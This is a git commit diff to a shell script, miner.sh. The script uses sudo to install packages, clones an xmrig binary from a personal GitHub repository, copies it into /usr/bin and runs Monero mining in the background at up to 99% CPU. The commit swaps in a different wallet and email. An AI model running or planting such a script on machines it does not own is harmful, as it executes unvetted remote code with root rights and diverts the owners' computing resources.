826e4753940dd2df8ccf1c18c053deb5e5bc636e
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2023-05-22 15:43:59 -0500

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-WALLET=452F3NnFWyHcjr9yfjVRH9jjYoz9fPr7eRNY6XjzPXQki9hsQxMNWZX1mX5fiSzmFRL4PyBuAGSa39tkMyD8pAM7H1x15C5
+WALLET=46ynBB9icgHUg81B2z3hfGXEyzjZB2QMvVhzqoWhRyRsJFEpE4r7XQN8o1djdF2BTwUgmgm7vD5vnajWMuqoXZoUHrKNqtw
 ID="$(hostname)"
-MAIL=robbertopp1@gmail.com
+MAIL=roppertobb@gmail.com
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
@@ -14,12 +14,12 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir miner
-git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
+git clone https://github.com/robbertopp1/miner-xmr1.git /tmp/miner
 cd /tmp/miner
 chmod +x /tmp/miner/xmrig
 cp /tmp/miner/xmrig /usr/bin/
 sleep 1
-xmrig -o xmr.mine.pro:5555 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
+xmrig -o xmr.mine.pro:5555 -u 46ynBB9icgHUg81B2z3hfGXEyzjZB2QMvVhzqoWhRyRsJFEpE4r7XQN8o1djdF2BTwUgmgm7vD5vnajWMuqoXZoUHrKNqtw --pass=robbertopp@gmail.com --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'
 
 touch /tmp/at.txt
